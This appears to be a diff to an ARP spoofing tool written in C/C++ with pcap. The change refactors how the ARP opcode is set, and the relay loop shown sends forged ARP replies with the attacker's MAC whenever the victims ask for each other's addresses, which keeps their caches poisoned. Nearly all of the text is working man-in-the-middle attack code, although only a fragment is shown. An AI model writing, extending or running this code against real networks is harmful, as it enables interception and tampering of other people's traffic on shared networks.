@@ -26,20 +26,20 @@ int request(const char *dev, pcap_t *pcap, u_int8_t *dest_mac, u_int8_t *source_
     packet.arp_.hln_ = 6;
     packet.arp_.pln_ = 4;
 
-    // packet.arp_.op_ = type;
-    if (type == 0)
-    {
-        packet.arp_.op_ = htons(ArpHdr::Request);
-    }
-    else if (type == 1)
-    {
-        packet.arp_.op_ = htons(ArpHdr::Reply);
-    }
-    else
-    {
-        printf("case 0 is sending request, case 1 is sending reply\n");
-        return -1;
-    }
+    packet.arp_.op_ = type;
+    // if (type == 0)
+    // {
+    //     packet.arp_.op_ = htons(ArpHdr::Request);
+    // }
+    // else if (type == 1)
+    // {
+    //     packet.arp_.op_ = htons(ArpHdr::Reply);
+    //}
+    // else
+    // {
+    //     printf("case 0 is sending request, case 1 is sending reply\n");
+    //     return -1;
+    // }
 
     memcpy(packet.arp_.smac_, sender_mac, 6);
     memcpy(packet.arp_.sip, sender_ip, 4);
@@ -109,14 +109,14 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, list *targets, 
             if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (!memcmp(pkt->arp_.smac_, targets[i].target_mac, 6)) && (!memcmp(pkt->arp_.tip, targets[i].sender_ip, 4)))
             {
                 printf("where is sender?\n");
-                request(dev, pcap, targets[i].target_mac, attacker_mac, attacker_mac, targets[i].sender_ip, targets[i].target_mac, targets[i].target_ip, 1);
+                request(dev, pcap, targets[i].target_mac, attacker_mac, attacker_mac, targets[i].sender_ip, targets[i].target_mac, targets[i].target_ip, htons(ArpHdr::Reply));
                 continue;
             }
 
             if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (!memcmp(pkt->arp_.smac_, targets[i].sender_mac, 6)) && (!memcmp(pkt->arp_.tip, targets[i].target_ip, 4)))
             {
                 printf("where is target?\n");
-                request(dev, pcap, targets[i].sender_mac, attacker_mac, attacker_mac, targets[i].target_ip, targets[i].sender_mac, targets[i].sender_ip, 1);
+                request(dev, pcap, targets[i].sender_mac, attacker_mac, attacker_mac, targets[i].target_ip, targets[i].sender_mac, targets[i].sender_ip, htons(ArpHdr::Reply));
                 continue;
             }
 
